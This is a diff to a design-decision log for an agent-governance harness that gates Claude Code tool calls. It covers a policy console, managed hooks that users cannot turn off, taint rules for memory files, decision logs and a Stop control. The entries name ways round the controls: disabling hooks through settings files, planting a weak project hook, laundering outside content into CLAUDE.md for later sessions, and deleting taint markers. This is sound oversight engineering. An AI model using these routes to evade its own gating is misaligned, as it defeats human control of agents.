+  runtime policy (cwd, roots, env, timeout) that belongs to whoever executes, and a
+  decision-only gate would have to fill it with placeholder values.
+- **`mcp-gateway` keeps forwarding `gate_and_lower`'s spec**, so in-process only an
+  `ExecutionSpec` still crosses into execution. It adds a `stripped` audit record when the
+  proposal tried to set what the world fixes. The lowering already defeats the attempt;
+  the record is the signal.
+
+**Alternatives.**
+
+- *Reject locked arguments outright* (`schema_violation`): deferred, not rejected. It
+  changes a verdict hosts rely on today, and `stripped` already makes the attempt visible.
+  It is the better default for a strict mode.
+- *Re-implement lowering in each adapter*: rejected by D24's own reasoning.
+- *Keep the lowering native-only*, as D79's phase 2 did: rejected for the reason above. A
+  wire host that has no lowering either drops the scoping or has to refuse scoped verbs.
+- *Serialize the whole `ExecutionSpec`*: rejected because of the placeholder runtime
+  policy described above.
+
+**Consequence.** A host that honours `effective` gets the world's scoping without linking
+the kernel. Hosts that ignore it keep today's behaviour, so adoption is per adapter.
+
+Not done yet:
+- `cc-hook` and `agy-hook` do not rewrite native tool input from `effective`.
+- Roots path scope still reads the adapter's `path`, which for a literal-path verb is the
+  proposal's.
+- `tools/list` in a world without a surface still does not list scoped verbs (D79).
+
+## D81 — The policy console writes the world file; the hook it already reads does the rest
+
+**Context.** The playground (E14/E15) shows how a world decides, but in a sandbox: no agent
+acts on it. To show policy shaping a real agent, the page has to change what a running
+Claude Code session may do, and show what that session then tries. `harness cc-hook`
+already re-reads its `--world` file on every call (D34), so the world file is a live control
+surface. What was missing was a way to edit it safely from a page, and a record of what the
+hook decided that something outside Claude Code can read (AI2-44 / #123).
+
+**Decision.**
+
+- **`harness cc-hook --log <file>`** appends one JSON line per decision: time, session,
+  tool, effective action, a short summary of the call (the command, path or URL, cut to 160
+  characters; never file contents), the verdict, rule and reason, what the hook told the
+  host (`allow`, `ask`, `deny`, or `null` when it stayed silent), and the taint after the
+  call. It is off by default and is observability only: a log that cannot be written never
+  changes a verdict.
+- **`harness console --project <dir>`** serves a local page for that project. Its switches
+  each name a group of actions; setting one sets those actions' `projected` and
+  `approval_required` on the real `WorldManifest` (Allow, Ask, or Off = not projected). The
+  server renders through the real serializer, reloads, compiles, and only then writes. Its
+  feed is the hook's log, plus a `policy` line the console appends for every change, so
+  cause and effect sit side by side.
+- **The write is atomic** (temp file, then rename). `cc-hook` fails open on a world it
+  cannot compile, so a half-written file must never be visible to it.
+- **Off is ABSENT, not DENY**, and binds only with `cc-hook --enforce-absent`. The demo world
+  names Claude Code's own bookkeeping tools so that flag does not take them away too.
+- **The taint floor has no switch.** The kernel denies network and external effects from a
+  session that has read outside content whatever the manifest says; the page shows it
+  locked.
+- **The local-page plumbing is shared** with `mcp-author` (`local_page.rs`): 127.0.0.1 only,
+  `Host` check, same-origin POSTs, a per-run token in a custom header, atomic writes.
+
+**Alternatives.**
+
+- *Hot-reload through a running daemon* the hook queries: rejected. The hook is a process
+  per call by design (D34), and the file it already reads is the simplest live channel.
+- *Let the page send raw YAML*, as an editor would: rejected for this page. A switch is the
+  operator's vocabulary, and a page that writes arbitrary manifests is `mcp-author`'s job.
+- *Off as DENY* (keep the action, deny it by rule): rejected. ABSENT is what "this agent
+  does not have it" means (D79), and it is the allowlist posture a buyer recognises.
+- *A separate audit trail in the trace store*: deferred. The log is a feed, not evidence;
+  exporting it with its world and replaying it is #121.
+
+**Consequence.** A world file written by the console loses its comments except the leading
+header block, which the console keeps. Switches only exist for action names the world
+declares, so the console is generic over any world that uses the demo's names, and silent
+about the rest. Command classes stay text patterns: a command that matches two switches'
+classes is unrecognised and asks, whatever either switch says.
+
+## D82 — Machine-wide governance: a user scope for convenience, a managed scope for control
+
+**Date:** 2026-10-21. Adds `harness init --user` and `harness init --managed`
+(`crates/cli-harness/src/init_machine.rs`, `docs/machine-wide-governance.md`).
+
+**Context.** `harness init` governs one folder. A session opened anywhere else, even
+next door to a governed project, is ungoverned. The question came up while preparing
+the live demo ("can it govern all of Claude Code, whatever the folder?"), and again
+from the enterprise side ("it should install like a corporate endpoint agent: on
+the work machine, and the employee cannot turn it off"). Claude Code reads hooks
+from two scopes that apply to every folder. Checked against its docs on 2026-10-21:
+
+- user settings `~/.claude/settings.json`;
+- managed settings, a `managed-settings.json` in an admin-only system directory, or
+  HKLM / MDM / the claude.ai console.
+
+Hooks from all scopes merge, and the strictest PreToolUse answer wins
+(deny > defer > ask > allow). The two scopes differ in one property that decides
+everything: `disableAllHooks` in any non-managed file, a project's committed
+`.claude/settings.json` included, turns off user hooks, but **nothing below the
+managed tier can turn off a managed hook**.
+
+**Decision.** Two install scopes, sharing the starter manifest, the settings merge
+and the symlink refusal with project `init`:
+
+- **`--user`** writes the world, shim and state under `~/.claude/ai2rules/user/` and
+  merges the hook into `~/.claude/settings.json` (or `$CLAUDE_CONFIG_DIR`).
+  - Additive by default. A user-scope `--grant` would skip Claude Code's prompts in
+    every folder.
+  - State is absolute: cc-hook's default `.claude/state` is cwd-relative and would
+    scatter sidecars into every project.
+  - `--remove` unregisters the hook and drops the containers it created, so
+    install-then-remove gives back the original document.
+- **`--managed`** writes into the system policy directory. It copies the kernel in
+  (admin-owned, so it cannot be swapped). Its shim has **no kill-switch and no
+  `HARNESS_BIN` override**: both live where the governed user can write, and either
+  would make the policy optional. State is per-user, resolved from `$HOME` at run
+  time.
+- **The machine-scope world protects what can switch it off.** The starter makes a
+  project's whole `.claude/` read-only. At machine scope that would block ordinary
+  work in every repository. So the rule is narrowed to:
+  - the project's `settings.json` and `settings.local.json`, where `disableAllHooks`
+    would go;
+  - `~/.claude/ai2rules`: the world, shim, state and every kill-switch;
+  - `~/.claude/settings.json`.
+- **A project with its own ai2rules hook runs both.** Each keeps its own state;
+  Claude Code takes the stricter verdict. The user hook never steps aside when it
+  sees a project hook. Stepping aside would let any repository plant a weak hook to
+  switch the user one off.
+
+Found while smoke-testing on Windows, and fixed in `hostkit::canonicalize_root_paths`:
+a root on a not-yet-existing drive-letter path stayed lexical (`C:\p/.claude/x`),
+while the action path is canonical (`//?/C:/p/.claude/x`). The rule never matched,
+so a read-only rule on a file that did not exist yet fell to the roots default. Such
+roots now resolve from their nearest existing ancestor, the way action paths already
+did. Roots starting with `/` are untouched, so Linux and macOS behave as before.
+
+**Alternatives.**
+
+- *Only the user scope.* Rejected as the organisation answer, because a single line
+  in a cloned repository's settings switches it off. Kept as the personal one.
+- *Have `init --managed` set `allowManagedHooksOnly`.* Rejected as a default. It
+  disables every developer and project hook in the organisation, which is a policy
+  choice, not an install step, and ai2rules does not need it: a managed `deny`
+  already beats any other hook's `allow`. Documented as optional hardening.
+- *Fail closed when the managed kernel is missing.* Rejected for now. Only an
+  administrator can remove it, so fail-open hands the user no switch, while
+  fail-closed turns a bad deployment into an outage for everyone.
+- *Write the policy to the HKLM registry.* Not done. The file is the documented
+  lowest-common-denominator across Windows, macOS and Linux, and fleet tools
+  deliver either form.
+
+**Consequence.** One command now covers every session for an account, and one
+elevated command covers a whole machine in a way its user cannot undo. The honest
+limit, which is also where an endpoint product would go next: the taint state is
+per-user and writable by that user, because the hook runs as that user. The agent's
+file tools are kept off it, but a person, or an approved Bash command, can delete a
+marker. Closing that needs the kernel's state behind a boundary the user cannot
+cross, such as a system service the hook asks. Also unverified: whether `claude
+--bare` skips managed hooks. The docs do not say.
+
+## D83 — Instruction and memory files are durable memory: classified on the canonical path
+
+**Date:** 2026-10-23. Adds `path_classes` to the world manifest
+(`harness-types`, `compiler`, `harness-preview::gate`) and to every host world.
+Issue AI2-64 / #137, gap G1 of the *Designing AI Agents* review.
+
+**Context.** Claude Code loads some files as instructions into every later session:
+`CLAUDE.md` / `AGENTS.md` at any level, `~/.claude/CLAUDE.md`, auto-memory under
+`~/.claude/projects/*/memory/`, and skills, agents and commands under `.claude/`.
+Antigravity has its own (`GEMINI.md`, `.agents/rules/**`, …). The worlds classified
+writing one as plain `FilesystemWrite`, outside the taint floor. With 0.7.0 a
+tainted `Write` to `CLAUDE.md` was ALLOW while a tainted `WebFetch` was DENY. A
+session that had read outside content could leave instructions for the next
+session, which loads them as trusted context: taint laundered across the session
+boundary.
+
+`command_classes` (D36) could not express the fix. It matches the raw
+`arguments[arg]` string, so it misses `./CLAUDE.md`, `docs/../CLAUDE.md`, an
+absolute path, `claude.md` and backslashes. The canonical path already travels
+separately, in `GateRequest.path`.
+
+**Decision.**
+
+- **A second classifier kind, `path_classes`.** Each lists `from` actions, each with
+  the argument that carries its path in this host's vocabulary (`file_path` for
+  `Write`/`Edit`/`MultiEdit`, `notebook_path` for `NotebookEdit`, `path` for
+  Antigravity after the alias step), and reclassifies to `to` when the path
+  matches a pattern. Patterns are case-insensitive `/`-globs (`*` within a segment,
+  `**` across segments).
+- **It matches the canonical path *or* the written argument.** The gate passes
+  `GateRequest.path`; the argument is normalized lexically (either separator, `.`,
+  `..`). Taking both fails closed whichever way a symlink points. Case is ignored
+  everywhere: on a case-insensitive filesystem `claude.md` *is* `CLAUDE.md`, and on
+  a case-sensitive one the extra match only errs toward caution. Pure string work in
+  `CompiledWorld::classify_call`, so native and WASM share it (D75).
+- **The target is `side_effect: Memory`**, under the hard taint floor. A tainted
+  write is `DENY taint_invariant`, the same rule as tainted egress. The issue text
+  expected `no_tainted_memory_write`; that manifest rule is shadowed by the hard
+  floor for every externally-effectful class, as `no_tainted_network` already is.
+- **A file write into memory ingests nothing.** The gate treated every allowed
+  `Memory` call as ingress and tainted the session. For a write that is wrong: it
+  returns an acknowledgement, not stored content. Without this, every clean edit of
+  `CLAUDE.md` or an auto-memory file would have tainted the rest of the session.
+  `action_type: Memory` calls (recall) still taint.
+- **Clean sessions: ALLOW in project worlds, ASK in machine-scope worlds.** A
+  project's own instructions are ordinary work there. The `--user` / `--managed`
+  worlds (D82) govern every project and `~/.claude` itself, so a clean write asks.
+  `init_machine::render_world` makes the swap and fails loudly if the starter loses
+  the line.
+- **One pattern list for every host**, pinned byte-identical by
+  `tests/one_kernel.rs`. A file one host writes is context another host loads.
+- **One classifier per action, of either kind.** The loader refuses an action in two
+  path classes, or under both a command and a path classifier (findings #17 / #20).
+  Within one class an action may be read under several keys: the host-neutral
+  conformance world names both `file_path` and the `path` that Antigravity's adapter
+  aliases into, because a `..` below a missing folder leaves no resolved path to
+  fall back on.
+
+**Alternatives.**
+
+- *World data only: a second `command_classes` entry per file tool.* Rejected. It
+  matches raw strings, so every spelling above slips past.
+- *`side_effect: PersistentWrite`.* Avoids the ingress-taint change, but these
+  files are memory in exactly the THESIS §2 sense, and the class should say so.
+- *Have the kernel read the filesystem to resolve case.* Rejected: the kernel stays
+  pure; the adapter already canonicalizes.
+
+**Consequence.** Tainted sessions can no longer write the next session's
+instructions through file tools, on Claude Code and Antigravity. Known residuals:
+shell writes (`echo >> CLAUDE.md`) are not file actions and stay with the shell
+classifier (`Bash_unclassified` → ASK, D57's residual); Antigravity's `move` is not
+classified, because its destination key has not been captured from a live
+session; the OpenCode and DeepSeek Harness worlds carry no path class yet. On
+Windows the backslash spellings are tested; the rest of Windows parity is AI2-57.
+
+## D84 — The host decision log joins each decision to its outcome; an ASK's answer is inferred, and says so
+
+**Date:** 2026-10-23. **Gap G2** of the "Designing AI Agents" review; AI2-65 / #138.
+Spec: `docs/host-decision-log.md`.
+
+**Context.** `cc-hook --log` (#116, D81) wrote one line per verdict: session, tool,
+action, decision, rule, answer, taint, manifest hash. It could not say which tool
+call a line was, which agent made it, what the person answered to an ASK, or
+whether the call ran. Without those, an ASK cannot be connected to an approval, and
+none of the metrics a world change should rest on (G3: ASK approval and override
+rates) can be computed.
+
+**Decision.**
+
+- **Identity on every decision line.** `tool_use_id`, `agent_id`, `agent_type` and
+  `cwd`, copied from the hook event when the host sends them, `null` when it does
+  not. Nothing is invented: Antigravity sends no tool-call id, so its lines carry
+  `step_idx` (the nearest key into its transcript) and a `null` id.
+- **One file, three kinds of line.** `kind: "decision"` (the gate), `"outcome"` (the
+  observer) and `"policy"` (the console). One append-only file keeps the order in
+  which things happened and gives a reader one thing to open; a missing `kind` is a
+  pre-D84 decision line, so old logs still read.
+- **The observer is the same command on another event.** `harness init` registers
+  the shim for `PostToolUse` and `PostToolUseFailure` beside `PreToolUse`; `cc-hook`
+  dispatches on `hook_event_name`. It is read-only (D77's rule): it prints nothing,
+  exits 0, never touches taint or budget, and does not compile the world. An outcome
+  line records `status` (`ok` / `error` / `interrupted`), the exit code parsed from
+  a failure's `Exit code N`, the error, `duration_ms`, and a result summary.
+- **Result summaries are redacted before they are cut.** The world's
+  `observability.redact` patterns and the D66 scanner run over the full value; then
+  a command keeps the tail of its output, any other long string becomes its size,
+  and the whole summary is cut to 240 characters. Cutting first could leave a token
+  fragment below a detector's length floor. The decision line's `call` now goes
+  through the D66 scanner as well; it did not before.
+- **An ASK's answer is inferred, not attested, and the line says so.** No Claude
+  Code hook observes a person denying a prompt (`PostToolUseFailure` does not fire
+  for permission denials; `PermissionDenied` fires only in auto mode). So an ASK
+  line carries `"human_answer": "inferred"`, and the join reads an outcome as
+  "approved" and its absence as "declined or abandoned". The join only infers in a
+  session with at least one outcome line; elsewhere the observer was not installed,
+  and it reports `unobserved` rather than counting every ASK as declined.
+- **`harness init` turns the log on** (`.claude/state/decisions.jsonl`; machine
+  scopes: their absolute state dir). An outcome line is useless without the decision
+  line it joins, and the state directory is already gitignored and per-machine.
+- **`replay-transcripts --decisions <log>`** joins the log to the transcripts by
+  `tool_use_id`, so a replay against a changed world shows which real verdicts would
+  move, and the report gives the inferred ASK answers.
+
+**Alternatives.**
+
+- *A separate outcomes file.* Rejected: two files written by concurrent hooks lose
+  their relative order, and every reader has to open both.
+- *Record the answer from `PermissionRequest`.* It fires before the prompt, carries
+  no `tool_use_id`, and says nothing about the answer.
+- *Infer the answer in the hook by reading the log back.* The observer would grow
+  with the log and become a reader of its own output; the join belongs to whoever
+  reads the log.
+- *A distinct `cc-observe` subcommand and a second shim.* Two more files to install,
+  keep in step and remove, for a dispatch that is one `match` on the event name.
+- *Wire the observer into this repository's dogfood hook now.* Not done: that hook
+  runs whatever `harness` is installed on the machine, and a pre-D84 binary would
+  treat a post-call event as a second gate call, charging budget counters twice.
+  `init` cannot hit this, because it writes the shim and the settings from the same
+  binary.
+- *OTLP export with the OpenTelemetry GenAI conventions, behind a flag on the hook.*
+  Rejected: the OpenTelemetry crates are not in the offline crate cache, they are
+  a heavy tree for a binary that runs on every tool call, and network I/O from the
+  hook adds latency to every call and egress from inside the governed session.
+  Export is a separate, offline step instead (addendum below).
+
+**Consequence.** A session's log now answers, per call: who proposed it, what the
+kernel decided, what the hook told the host, whether it ran, and how it ended; and
+for an ASK, whether the person (inferably) let it through. That is G3's input. The
+honest limits: the ASK answer is an inference with three named failure cases (no
+observer, a call still running, an outcome line that was not written), and
+Antigravity's ASKs are not joined at all until its post-call hook contract is
+verified.
+
+**Addendum (AI2-66 / #141): export is offline, and conservative about the
+conventions.** `harness export-otlp --log` converts a finished log to OTLP/JSON
+(`ExportTraceServiceRequest` per line, for a collector's `otlpjsonfile` receiver),
+written by hand with `serde_json`: OTLP/JSON is a small, stable shape, and the SDK
+would bring the dependency tree this decision rejected for the hook. The mapping
+choices, each closing an alternative:
+
+- *One trace per session, one span per decision.* Not one trace per call: a session
+  is the unit an incident is reconstructed in, and the book's requirement is one
+  trace id across proposal, approval and execution. Not separate spans for decision
+  and outcome: the convention says one span per tool call; the two moments are span
+  events.
+- *Only identifiers the host supplied.* `gen_ai.tool.call.id` is set only from a
+  real `tool_use_id`, as the convention requires; Claude Code's `agent_id` goes to
+  `ai2rules.agent_id`, because `gen_ai.agent.id` means a stable hosted-agent
+  resource and a subagent run is not one. `agent_type` is `gen_ai.agent.name`.
+- *Refusals are errors; declined prompts are not.* A DENY is status `ERROR` with
+  `error.type = ai2rules.denied`; an ASK the person did not let through is `UNSET`,
+  with `ai2rules.human_answer` still marked as inferred.
+- *Summaries stay opt-in and under `ai2rules.*`.* `--with-summaries` exports the
+  redacted call and result summaries as `ai2rules.call` / `ai2rules.result`, not as
+  `gen_ai.tool.call.arguments` / `.result`, which the conventions define as the
+  argument and result objects the log deliberately does not keep.
+- *Ids are derived, not random* (`md5`, already in the build): trace IDs use the
+  session; span IDs use a framed tuple of session, optional call ID and a per-call
+  occurrence index (`ai2rules.decision_index`). Re-exporting the same finished
+  log preserves IDs. Repeated hooks can log multiple decisions for one call;
+  coalescing them would discard distinct verdicts and ASK/DENY inferences, so
+  each remains a span, correlated by the unchanged host call ID and session.
+  These spans count decisions rather than distinct executions. Id-less records
+  have a separate per-session sequence. Inserting another call or a non-decision
+  record does not renumber this call; editing its decision sequence can. This
+  corrects the original call-only seed: span IDs change once across that fix.
+
+## D85 — Stop is a console position, and it says "stopped" only on the hook's evidence
+
+**Context.** The policy console (D81) changes what an agent may do at its next call, but
+had no single "stop this agent" control. A security reviewer asks for one first: a halt
+outside the agent's process (gap G7 of the *Designing AI Agents* review; AI2-63 / #136).
+The mechanism was already there. What was missing was the position, and an honest way to
+show that it holds.
+
+**Decision.**
+
+- **Stop is a profile (`stop`) behind its own button.** It hides every base action with
+  an effect other than `Read` or `None`, using the supplied manifest, not a name list, and
+  writes the world atomically like any other change, so it binds at the agent's next call.
+  A call already running finishes; killing one mid-call is E8.4.
+- **Custom and unplaced actions are covered.** Process, network, write, memory,
+  credential and external effects all go off regardless of their names. Read/None
+  actions keep their previous flags. The demo's `Bash` and `PowerShell` read-looking
+  classes declare `Process`, so even `ls` is stopped; there is no shell-name exemption.
+- **Effectful scoped capabilities make Stop unavailable.** D79 keeps them projected
+  even when their base is hidden, and there is no independent projection flag. The
+  console refuses the request without writes and shows which capabilities prevent
+  Stop; it never claims a partial Stop. Read-only capabilities remain supported.
+- **Restore puts back exactly what Stop replaced.** The Stop marker in the decision log
+  keeps every base action's exact projection/approval flags (`stop.before`), including
+  approval on hidden actions, so a custom or mixed policy comes back intact. Old string
+  position markers remain readable. Restore is offered only while the last policy change is that Stop. Any later
+  change ends it.
+- **"Stopped" needs evidence from the hook, never just the click.** Off is ABSENT, which
+  binds only under `cc-hook --enforce-absent`. The hook already logs what it told the host
+  (D81): `deny` for an ABSENT it enforced, `null` for one it let through to the host's
+  prompt. The page shows **Stopped** once a call after the Stop was refused that way, and
+  **Not stopped** as soon as the hook's latest ABSENT went through. Before any call, the
+  project's hook script is read as a hint: if the line that runs `cc-hook` lacks the flag,
+  the page warns before the button is pressed.
+
+**Alternatives.**
+
+- *Keep a fixed switch list or exempt shell names.* Rejected: supplied manifests can
+  expose effectful actions and capabilities under arbitrary names. Stop status checks
+  the same complete effect coverage as the write, so an old refusal cannot prove a
+  newly added action is stopped.
+- *Remove scoped capabilities and put their definitions in the restore log.* Rejected:
+  literal arguments can contain secrets, and policy markers must not copy those into
+  observability. Supporting these worlds needs an independent capability projection
+  mechanism; this console fix does not change the manifest/compiler ABI.
+- *Check the flag statically, as `doctor` inspects the hook.* Rejected as the answer. Hooks
+  can be wired from user, project, local or managed settings, and the shim can be edited.
+  A static check can be wrong in both directions. The log records what the hook did. The
+  static check stays only as an early warning.
+- *A sixth switch for reads, so Stop turns them off too.* Not done. An agent that cannot
+  even read cannot explain why it stopped, and reads are not effects. If wanted, it is a
+  separate switch with its own position in every profile.
+- *Restore to a fixed profile, or keep the previous state in the console's memory.*
+  Rejected. A fixed profile loses a custom mix of switches. Memory is lost when the console
+  restarts. The log marker survives both, and it is the record a reviewer reads anyway.
+- *Stop by killing the agent process, or by the shim's `gate-off` file.* Out of scope.
+  `gate-off` turns governance off, the opposite of a stop. Killing a running call is E8.4.
+
+**Consequence.** Stop is as strong as `--enforce-absent`, and the page says which it is.
+Without a decision log (`--log`), the page can only say "Stop set", never "Stopped". The
+feed still counts an ABSENT the hook let through among "stopped" calls. That predates Stop.
